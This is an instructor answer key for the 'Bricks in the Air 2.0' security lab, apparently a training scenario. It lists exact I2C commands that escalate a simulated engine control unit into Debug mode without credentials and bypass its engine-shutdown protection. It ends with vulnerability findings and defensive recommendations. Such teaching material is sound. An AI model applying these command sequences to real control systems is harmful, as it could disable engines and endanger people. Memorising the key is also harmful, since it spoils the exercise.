# SCENARIO ANSWER KEY
### Bricks in the Air 2.0 — Instructor Reference

---

> **Do not distribute to participants.**

---

## Initial System State

When the simulation starts, the ECU is in the following state:

| Parameter | Value |
|-----------|-------|
| Engine Speed | 2 (Speed 2) |
| Mode of Operation | Primary (0x00) |
| Maintenance Status | Disabled (0x00) |

---

## Step 1: Read Current Engine Speed

**Command:**
```
[0xAA 0x10][0xAB r]
```

**Expected Response:**
```
READ: 0xAB ACK 0x02
```

**Answer:** The ECU starts at **Speed 2**.

---

## Step 2: Test Valid Engine Speeds

All speeds 1–4 are accepted in normal (Primary) mode.

| Speed | Command | Expected Response | Result |
|-------|---------|-------------------|--------|
| Speed 1 | `[0xAA 0x11 0x01][0xAB r]` | `0x01` | Accepted |
| Speed 2 | `[0xAA 0x11 0x02][0xAB r]` | `0x01` | Accepted |
| Speed 3 | `[0xAA 0x11 0x03][0xAB r]` | `0x01` | Accepted |
| Speed 4 | `[0xAA 0x11 0x04][0xAB r]` | `0x01` | Accepted |

**Key observation:** The flight safety system allows all operational speeds. The restriction only targets engine *shutdown*.

---

## Step 3: Test Invalid Engine Speeds

| Speed | Command | Expected Response | Result |
|-------|---------|-------------------|--------|
| Speed 0 (Off) | `[0xAA 0x11 0x00][0xAB r]` | `0xDE` | **Rejected** |
| Speed 5 | `[0xAA 0x11 0x05][0xAB r]` | `0xDA` | **Fault Detected** |

**Speed 0:** The safety system correctly rejects engine shutdown in normal mode.

**Speed 5:** Returns `0xDA` (Fault Detected). The ECU goes offline. On the physical aircraft:
- Propeller runs at full speed (100%) for 10 seconds
- Smoke system fires automatically
- ECU stops accepting commands

**Recovery:** Type `system reset` at the prompt.

---

## Step 4: Attempt to Enter Debug Mode (Primary Mode)

**Command:**
```
[0xAA 0x41 0x01][0xAB r]
```

**Expected Response:**
```
READ: 0xAB ACK 0xDE
```

**Answer:** **Rejected.** The ECU requires Secondary mode before Debug mode can be enabled. This is the intended two-step unlock mechanism.

---

## Step 5: Switch to Secondary Mode

**Command:**
```
[0xAA 0x31 0x01][0xAB r]
```

**Expected Response:**
```
READ: 0xAB ACK 0x01
```

**Verify the change:**
```
[0xAA 0x30][0xAB r]
```
Response: `0x01` (Secondary mode confirmed)

**Answer:** **Accepted.** The ECU is now in Secondary mode.

> **Vulnerability note:** No authentication is required to switch to Secondary mode. Any device with I2C bus access can escalate operating mode without credentials.

---

## Step 6: Enter Debug Mode from Secondary Mode

**Command:**
```
[0xAA 0x41 0x01][0xAB r]
```

**Expected Response:**
```
READ: 0xAB ACK 0x01
```

**Answer:** **Accepted.** Debug mode is now enabled.

**Verify:**
```
[0xAA 0x40][0xAB r]
```
Response: `0x01` (Debug/Maintenance mode confirmed)

---

## Step 7: Retest Speed 0 in Debug Mode

**Command:**
```
[0xAA 0x11 0x00][0xAB r]
```

**Expected Response:**
```
READ: 0xAB ACK 0x01
```

**Answer:** **Accepted.** In Debug mode, Speed 0 is no longer blocked. The flight safety restriction has been bypassed.

> **This is the critical vulnerability.** An attacker who can reach the I2C bus can:
> 1. Switch to Secondary mode (no credentials required)
> 2. Enable Debug mode (no credentials required)
> 3. Command Speed 0 — shutting down the engine mid-flight

---

## Step 8: Simulate Malicious Behavior (Speed 5 in Debug Mode)

**Command:**
```
[0xAA 0x11 0x05][0xAB r]
```

**Expected Response:**
```
READ: 0xAB ACK 0xDA
```

**Answer:** **Fault Detected** — even in Debug mode, Speed 5 triggers an unrecoverable engine fault.

Physical effects on the aircraft:
- Engine warning messages print to the terminal: `*** ENGINE OVERHEATING ***`, `*** ENGINE DAMAGE DETECTED ***`, `*** SHUT DOWN INITIATED ***`
- Propeller motor runs at 100% for 10 seconds
- Smoke system fires simultaneously

**Recovery:** `system reset`

---

## Step 9: Vulnerabilities Found

| # | Vulnerability | Severity | Details |
|---|--------------|----------|---------|
| 1 | **No authentication for mode escalation** | Critical | Any I2C device can switch to Secondary mode and enable Debug mode without credentials |
| 2 | **Debug mode bypasses engine shutdown protection** | Critical | Speed 0 (engine off) becomes available — enables malicious mid-flight engine cutoff |
| 3 | **Overspeed fault is destructive and unrecoverable** | High | Speed 5 immediately takes the ECU offline with no warning; requires full system reset |

---

## Step 10: Threat Report Summary

### Strengths

- Normal mode correctly rejects Speed 0 (engine shutdown cannot be commanded in flight)
- Fault detection for overspeed (Speed 5) prevents uncontrolled over-rev
- Two-step unlock (Secondary mode → Debug mode) adds one layer of friction

### Weaknesses

- Mode escalation requires zero authentication — any I2C master can escalate
- Debug mode removes the only meaningful speed restriction (Speed 0 block)
- No rate limiting or audit logging on I2C commands
- No mutual authentication between I2C master and device

### Recommendations

- Require cryptographic authentication (e.g., challenge-response) before accepting mode changes
- Enforce Speed 0 restriction in Debug mode as well, or limit debug access to ground operations only
- Physically isolate the debug interface (maintenance-only terminal, not shared bus)
- Add command rate limiting to detect and reject command floods
- Log all I2C transactions to a tamper-evident store
